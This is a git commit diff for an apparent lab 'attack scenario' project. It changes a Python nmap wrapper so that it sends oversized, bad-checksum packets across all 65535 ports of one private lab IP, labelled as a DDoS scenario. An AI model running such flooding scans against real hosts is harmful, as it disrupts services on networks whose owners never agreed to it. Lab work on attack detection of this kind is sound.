33ccc2cc1debd4843a74d703243ab5abb0b2f9dd
brwook <dladnguq131@naver.com>
2023-05-24 06:17:18 -0700

    [ADD] Attack Scenario - DDoS

--- attack_scenario/nmap_gyu.py
+++ attack_scenario/nmap_gyu.py
@@ -1,9 +1,11 @@
+#!/usr/bin/env python3
 import subprocess
 
 def run_nmap_scan(targets, ports):
     try:
         # nmap 실행 명령어
-        command = ['nmap', '-p', ports, *targets]
+        command = ['nmap', '-p', ports, *targets, '--data-length', '65434', '--badsum']
+        print(command)
         
         # 외부 명령어 실행
         output = subprocess.check_output(command)
@@ -15,6 +17,6 @@ def run_nmap_scan(targets, ports):
         print(f"오류 발생: {e}")
         
 # 테스트
-target_ips = ["127.0.0.1", "192.168.0.1", "10.0.0.1"]  # 대상 IP 주소 리스트
+target_ips = ["192.168.198.128"]  # 대상 IP 주소 리스트
 port_range = "1-65535"  # 스캔할 포트 범위
 run_nmap_scan(target_ips, port_range)
